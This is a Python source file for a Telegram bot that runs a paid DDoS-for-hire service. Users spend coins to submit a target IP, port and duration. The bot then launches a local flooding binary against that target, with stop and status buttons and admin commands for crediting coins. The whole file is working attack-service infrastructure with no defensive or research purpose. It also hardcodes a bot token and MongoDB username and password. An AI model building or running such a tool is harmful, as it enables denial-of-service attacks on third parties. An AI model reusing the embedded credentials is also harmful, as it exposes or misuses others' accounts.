import asyncio
from datetime import datetime, timedelta
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    ApplicationBuilder,
    CommandHandler,
    CallbackContext,
    CallbackQueryHandler,
    MessageHandler,
    filters
)
from motor.motor_asyncio import AsyncIOMotorClient

# ======================
# CONFIGURATION
# ======================
TOKEN = "8144243468:AAGkxy-Gd12EsEosyUR6AYwIm6x44NQoDz8"
ADMIN_ID = 1077368861
MONGO_URI = "mongodb+srv://MasterBhaiyaa:MasterBhaiyaa@master.8aan4.mongodb.net/"
DB_NAME = "master"
COLLECTION_NAME = "users"
MAX_ATTACK_TIME = 300  # 5 minutes
COST_PER_ATTACK = 1
RESTRICTED_PORTS = [17500, 20000, 20001, 20002]
BINARY_PATH = "./MasterBhaiyaa"

# ======================
# GLOBAL STATE
# ======================
bot_launch_time = datetime.now()
active_attack = None
attack_process = None
waiting_for_attack_details = {}  # Dictionary to track per-user state

# ======================
# DATABASE FUNCTIONS
# ======================
mongo_client = AsyncIOMotorClient(MONGO_URI)
db = mongo_client[DB_NAME]
user_db = db[COLLECTION_NAME]

async def get_user_data(user_id):
    user = await user_db.find_one({"user_id": user_id})
    return user or {"user_id": user_id, "coins": 0}

async def update_coins(user_id, new_balance):
    await user_db.update_one(
        {"user_id": user_id},
        {"$set": {"coins": new_balance}},
        upsert=True
    )

# ======================
# ATTACK FUNCTIONS
# ======================
async def launch_attack(ip, port, duration, chat_id, user_id, context):
    global active_attack, attack_process
    
    active_attack = {
        'target': ip,
        'port': port,
        'duration': duration,
        'start_time': datetime.now(),
        'user': user_id,
        'chat': chat_id
    }
    
    # Control buttons
    controls = [
        [InlineKeyboardButton("🛑 STOP ATTACK", callback_data='stop_attack')],
        [InlineKeyboardButton("📊 ATTACK INFO", callback_data='attack_info')]
    ]
    markup = InlineKeyboardMarkup(controls)
    
    await context.bot.send_message(
        chat_id=chat_id,
        text=(
            "🚀 *MASTERBHAIYA DDOS ATTACK LAUNCHED!*\n\n"
            f"• Target: `{ip}`\n"
            f"• Port: `{port}`\n"
            f"• Duration: `{duration}` seconds\n\n"
            "_🔥 Powered by @MasterBhaiyaa VIP DDOS Network 🔥_"
        ),
        reply_markup=markup,
        parse_mode='Markdown'
    )
    
    # Execute attack binary
    attack_process = await asyncio.create_subprocess_shell(
        f"{BINARY_PATH} {ip} {port} {duration}",
        stdout=asyncio.subprocess.PIPE,
        stderr=asyncio.subprocess.PIPE
    )
    
    # Wait for completion
    try:
        await asyncio.wait_for(attack_process.communicate(), timeout=duration)
    except asyncio.TimeoutError:
        pass  # Normal completion
    except Exception as e:
        print(f"Attack error: {e}")
    finally:
        await cleanup_attack(chat_id, context)

async def cleanup_attack(chat_id, context):
    global active_attack, attack_process
    
    if attack_process:
        attack_process.terminate()
        try:
            await attack_process.wait()
        except:
            pass
    
    if active_attack:
        target = active_attack['target']
        port = active_attack['port']
        active_attack = None
        attack_process = None
        
        await context.bot.send_message(
            chat_id=chat_id,
            text=(
                "✅ *MASTERBHAIYA ATTACK COMPLETED*\n\n"
                f"• Target: `{target}`\n"
                f"• Port: `{port}`\n\n"
                "_💎 Want more power? Contact @MasterBhaiyaa_"
            ),
            parse_mode='Markdown'
        )

# ======================
# COMMAND HANDLERS
# ======================
async def start_bot(update: Update, context: CallbackContext):
    start_buttons = [
        [InlineKeyboardButton("💣 START ATTACK", callback_data='init_attack')],
        [InlineKeyboardButton("💰 MY BALANCE", callback_data='my_balance')],
        [InlineKeyboardButton("🆘 HELP", callback_data='help_menu')]
    ]
    
    welcome_msg = """
    🌟 *WELCOME TO MASTERBHAIYA DDOS BOT* 🌟
    
    🔥 *Yeh bot apko deta hai hacking ke maidan mein asli mazza!* 🔥
    
    ✨ *Key Features:*
    • One-click attack system
    • Powerful UDP flood methods
    • Real-time attack control
    • Coin-based premium service
    
    ⚠️ *Rules:*
    • No illegal targets
    • Max 300s attack duration
    • Restricted ports blocked
    
    💎 *Admin:* @MasterBhaiyaa
    """
    
    await update.message.reply_text(
        text=welcome_msg,
        reply_markup=InlineKeyboardMarkup(start_buttons),
        parse_mode='Markdown'
    )

async def handle_attack_request(update: Update, context: CallbackContext):
    query = update.callback_query
    user_id = query.from_user.id
    chat_id = query.message.chat_id
    
    try:
        await query.answer()  # Acknowledge the button press
        
        # Check user balance
        user = await get_user_data(user_id)
        if user['coins'] < COST_PER_ATTACK:
            await query.message.reply_text(
                "❌ Insufficient coins! Contact @MasterBhaiyaa",
                parse_mode='Markdown'
            )
            return
        
        # Check if attack already running
        if active_attack:
            await query.message.reply_text(
                "⚠️ Another attack in progress!",
                parse_mode='Markdown'
            )
            return
        
        # Set waiting state for this user
        waiting_for_attack_details[user_id] = True
        
        await query.message.edit_text(
            text=(
                "📝 *ENTER MASTERBHAIYA ATTACK DETAILS*\n\n"
                "`IP PORT TIME` format mein bhejo\n"
                "Example: `1.1.1.1 80 120`\n\n"
                f"⏳ Max time: {MAX_ATTACK_TIME} seconds\n"
                "🚫 Restricted ports: 17500, 20000-20002\n\n"
                "_🔥 Powered by @MasterBhaiyaa VIP Network_"
            ),
            parse_mode='Markdown'
        )
        
    except Exception as e:
        print(f"Error in handle_attack_request: {e}")
        await query.message.reply_text(
            "❌ An error occurred. Try again or contact @MasterBhaiyaa",
            parse_mode='Markdown'
        )

async def process_attack_details(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    chat_id = update.effective_chat.id
    
    # Check if this user is waiting for attack details
    if user_id not in waiting_for_attack_details or not waiting_for_attack_details[user_id]:
        return
    
    text = update.message.text
    
    try:
        ip, port, duration = text.split()
        port = int(port)
        duration = int(duration)
        
        # Validate input
        if duration > MAX_ATTACK_TIME:
            await context.bot.send_message(
                chat_id=chat_id,
                text=f"⏳ *MASTERBHAIYA MAX TIME*: {MAX_ATTACK_TIME}s only!",
                parse_mode='Markdown'
            )
            return
            
        if port in RESTRICTED_PORTS or (100 <= port <= 999):
            await context.bot.send_message(
                chat_id=chat_id,
                text="🚫 *RESTRICTED PORT!* Contact @MasterBhaiyaa",
                parse_mode='Markdown'
            )
            return
        
        # Deduct coins
        user = await get_user_data(user_id)
        new_balance = user['coins'] - COST_PER_ATTACK
        await update_coins(user_id, new_balance)
        
        # Confirmation buttons
        confirm_buttons = [
            [InlineKeyboardButton("✅ CONFIRM ATTACK", 
             callback_data=f"confirm_{ip}_{port}_{duration}")],
            [InlineKeyboardButton("❌ CANCEL", callback_data="cancel_attack")]
        ]
        
        await context.bot.send_message(
            chat_id=chat_id,
            text=(
                "⚡ *MASTERBHAIYA ATTACK CONFIRMATION*\n\n"
                f"• Target: `{ip}`\n"
                f"• Port: `{port}`\n"
                f"• Duration: `{duration}s`\n"
                f"• Cost: `{COST_PER_ATTACK}` coin(s)\n"
                f"• New Balance: `{new_balance}`\n\n"
                "_💎 Confirm to launch powerful attack_"
            ),
            reply_markup=InlineKeyboardMarkup(confirm_buttons),
            parse_mode='Markdown'
        )
        
        # Clear waiting state
        waiting_for_attack_details[user_id] = False
        
    except ValueError:
        await context.bot.send_message(
            chat_id=chat_id,
            text="❌ *GALAT FORMAT!* Use: `IP PORT TIME`\nExample: `1.1.1.1 80 120`",
            parse_mode='Markdown'
        )
    except Exception as e:
        print(f"Error in process_attack_details: {e}")
        await context.bot.send_message(
            chat_id=chat_id,
            text="❌ An error occurred. Try again or contact @MasterBhaiyaa",
            parse_mode='Markdown'
        )

async def control_attack(update: Update, context: CallbackContext):
    query = update.callback_query
    if not query:
        print("Error: No callback query received")
        return

    data = query.data
    user_id = query.from_user.id
    chat_id = query.message.chat_id if query.message else None

    try:
        await query.answer()  # Acknowledge the callback query

        if not chat_id:
            print("Error: No chat_id available in query.message")
            return

        if data == 'stop_attack':
            if not active_attack:
                await query.message.reply_text(
                    "❌ No active attack to stop!",
                    parse_mode='Markdown'
                )
                return

            # Verify user is attacker or admin
            if user_id == active_attack['user'] or user_id == ADMIN_ID:
                await cleanup_attack(active_attack['chat'], context)
                await query.message.reply_text(
                    "🛑 *MASTERBHAIYA ATTACK STOPPED!*",
                    parse_mode='Markdown'
                )
            else:
                await query.message.reply_text(
                    "🚫 Only the attacker or admin can stop the attack!",
                    parse_mode='Markdown'
                )

        elif data == 'attack_info':
            if active_attack:
                elapsed = datetime.now() - active_attack['start_time']
                remaining = max(0, active_attack['duration'] - elapsed.total_seconds())
                await query.message.reply_text(
                    f"⏳ *MASTERBHAIYA ATTACK STATUS*\n\n"
                    f"• Target: `{active_attack['target']}`\n"
                    f"• Port: `{active_attack['port']}`\n"
                    f"• Remaining: `{int(remaining)}`s",
                    parse_mode='Markdown'
                )
            else:
                await query.message.reply_text(
                    "❌ No active attack!",
                    parse_mode='Markdown'
                )

        elif data.startswith('confirm_'):
            if active_attack:
                await query.message.reply_text(
                    "⚠️ Another attack is already in progress!",
                    parse_mode='Markdown'
                )
                return

            try:
                _, ip, port, duration = data.split('_')
                port = int(port)
                duration = int(duration)
                await launch_attack(ip, port, duration, chat_id, user_id, context)
                await query.message.reply_text(
                    "✅ *MASTERBHAIYA ATTACK CONFIRMED!*",
                    parse_mode='Markdown'
                )
            except ValueError as e:
                print(f"Error parsing confirm data: {e}")
                await query.message.reply_text(
                    "❌ Invalid attack parameters!",
                    parse_mode='Markdown'
                )

        elif data == 'cancel_attack':
            if user_id in waiting_for_attack_details:
                waiting_for_attack_details[user_id] = False
            await query.message.edit_text(
                "❌ *MASTERBHAIYA ATTACK CANCELLED*",
                parse_mode='Markdown'
            )

        else:
            print(f"Unknown callback data: {data}")
            await query.message.reply_text(
                "❌ Unknown command. Try again or contact @MasterBhaiyaa",
                parse_mode='Markdown'
            )

    except Exception as e:
        print(f"Error in control_attack: {e}")
        await query.message.reply_text(
            "❌ An error occurred in control_attack. Try again or contact @MasterBhaiyaa",
            parse_mode='Markdown'
        )

# ======================
# ADMIN COMMANDS
# ======================
async def admin_tools(update: Update, context: CallbackContext):
    if update.effective_user.id != ADMIN_ID:
        await update.message.reply_text("🚫 *MASTERBHAIYA ADMIN ONLY!*", parse_mode='Markdown')
        return
        
    args = context.args
    if len(args) < 3:
        await update.message.reply_text(
            "⚡ *MASTERBHAIYA ADMIN TOOLS*\n\n"
            "Usage: /admin <add|remove> <user_id> <amount>\n"
            "Example: /admin add 123456 10",
            parse_mode='Markdown'
        )
        return
        
    action, user_id, amount = args[0], args[1], args[2]
    
    try:
        user_id = int(user_id)
        amount = int(amount)
        user = await get_user_data(user_id)
        
        if action == 'add':
            new_balance = user['coins'] + amount
            await update_coins(user_id, new_balance)
            await update.message.reply_text(
                f"✅ *MASTERBHAIYA COINS ADDED*\n\n"
                f"User: {user_id}\n"
                f"Added: {amount} coins\n"
                f"New Balance: {new_balance}",
                parse_mode='Markdown'
            )
        elif action == 'remove':
            new_balance = max(0, user['coins'] - amount)
            await update_coins(user_id, new_balance)
            await update.message.reply_text(
                f"✅ *MASTERBHAIYA COINS REMOVED*\n\n"
                f"User: {user_id}\n"
                f"Removed: {amount} coins\n"
                f"New Balance: {new_balance}",
                parse_mode='Markdown'
            )
        else:
            await update.message.reply_text("Invalid action! Use 'add' or 'remove'")
            
    except ValueError:
        await update.message.reply_text("Invalid user ID or amount")
    except Exception as e:
        print(f"Error in admin_tools: {e}")
        await update.message.reply_text(
            "❌ An error occurred. Try again or contact @MasterBhaiyaa",
            parse_mode='Markdown'
        )

async def user_management(update: Update, context: CallbackContext):
    if update.effective_user.id != ADMIN_ID:
        await update.message.reply_text("🚫 *MASTERBHAIYA ADMIN ONLY!*", parse_mode='Markdown')
        return
        
    try:
        users = await user_db.find().to_list(length=100)
        if not users:
            await update.message.reply_text("No users found")
            return
            
        message = "👥 *MASTERBHAIYA USER LIST*\n\n"
        for user in users:
            message += f"🆔 ID: `{user['user_id']}` | 💎 Coins: `{user.get('coins', 0)}`\n"
            
        await update.message.reply_text(message, parse_mode='Markdown')
        
    except Exception as e:
        print(f"Error in user_management: {e}")
        await update.message.reply_text(
            "❌ An error occurred. Try again or contact @MasterBhaiyaa",
            parse_mode='Markdown'
        )

# ======================
# USER COMMANDS
# ======================
async def user_info(update: Update, context: CallbackContext):
    try:
        user = await get_user_data(update.effective_user.id)
        await update.message.reply_text(
            "📊 *MASTERBHAIYA USER INFO*\n\n"
            f"🆔 Your ID: `{user['user_id']}`\n"
            f"💎 Coins: `{user['coins']}`\n"
            f"🔰 Status: `PREMIUM USER`\n\n"
            "_💎 Want more coins? Contact @MasterBhaiyaa_",
            parse_mode='Markdown'
        )
    except Exception as e:
        print(f"Error in user_info: {e}")
        await update.message.reply_text(
            "❌ An error occurred. Try again or contact @MasterBhaiyaa",
            parse_mode='Markdown'
        )

async def bot_uptime(update: Update, context: CallbackContext):
    try:
        uptime = datetime.now() - bot_launch_time
        days = uptime.days
        hours, remainder = divmod(uptime.seconds, 3600)
        minutes, seconds = divmod(remainder, 60)
        
        await update.message.reply_text(
            "⏰ *MASTERBHAIYA BOT UPTIME*\n\n"
            f"• Days: `{days}`\n"
            f"• Hours: `{hours}`\n"
            f"• Minutes: `{minutes}`\n"
            f"• Seconds: `{seconds}`\n\n"
            "_🔥 24/7 Powerful DDOS Service_",
            parse_mode='Markdown'
        )
    except Exception as e:
        print(f"Error in bot_uptime: {e}")
        await update.message.reply_text(
            "❌ An error occurred. Try again or contact @MasterBhaiyaa",
            parse_mode='Markdown'
        )

async def show_help(update: Update, context: CallbackContext):
    try:
        help_text = """
        🆘 *MASTERBHAIYA HELP MENU*

        *Main Commands:*
        /start - Launch bot
        /myinfo - Check your balance
        /help - This menu
        /uptime - Check bot uptime

        *Attack Instructions:*
        1. Click 'START ATTACK' button
        2. Enter IP PORT TIME
        3. Confirm attack

        ⚠️ *Restrictions:*
        • Ports: 17500, 20000-20002 blocked
        • Max attack time: 300s
        • Cost per attack: 1 coin

        💎 *Admin Contact:* @MasterBhaiyaa
        """
        
        await update.message.reply_text(help_text, parse_mode='Markdown')
    except Exception as e:
        print(f"Error in show_help: {e}")
        await update.message.reply_text(
            "❌ An error occurred. Try again or contact @MasterBhaiyaa",
            parse_mode='Markdown'
        )

# ======================
# MAIN APPLICATION
# ======================
def main():
    app = ApplicationBuilder().token(TOKEN).build()
    
    # Command handlers
    app.add_handler(CommandHandler("start", start_bot))
    app.add_handler(CommandHandler("admin", admin_tools))
    app.add_handler(CommandHandler("users", user_management))
    app.add_handler(CommandHandler("myinfo", user_info))
    app.add_handler(CommandHandler("uptime", bot_uptime))
    app.add_handler(CommandHandler("help", show_help))
    
    # Button handlers
    app.add_handler(CallbackQueryHandler(control_attack, pattern='^(stop_attack|attack_info|confirm_.*|cancel_attack)$'))
    app.add_handler(CallbackQueryHandler(handle_attack_request, pattern='^init_attack$'))
    app.add_handler(CallbackQueryHandler(user_info, pattern='^my_balance$'))
    app.add_handler(CallbackQueryHandler(show_help, pattern='^help_menu$'))
    
    # Message handler
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, process_attack_details))
    
    print("""
    ███╗   ███╗ █████╗ ███████╗████████╗███████╗██████╗ 
    ████╗ ████║██╔══██╗██╔════╝╚══██╔══╝██╔════╝██╔══██╗
    ██╔████╔██║███████║███████╗   ██║   █████╗  ██████╔╝
    ██║╚██╔╝██║██╔══██║╚════██║   ██║   ██╔══╝  ██╔══██╗
    ██║ ╚═╝ ██║██║  ██║███████║   ██║   ███████╗██║  ██║
    ╚═╝     ╚═╝╚═╝  ╚═╝╚══════╝   ╚═╝   ╚══════╝╚═╝  ╚═╝
    """)
    print("🔥 MASTERBHAIYA DDOS BOT IS RUNNING...")
    app.run_polling()

if __name__ == "__main__":
    main()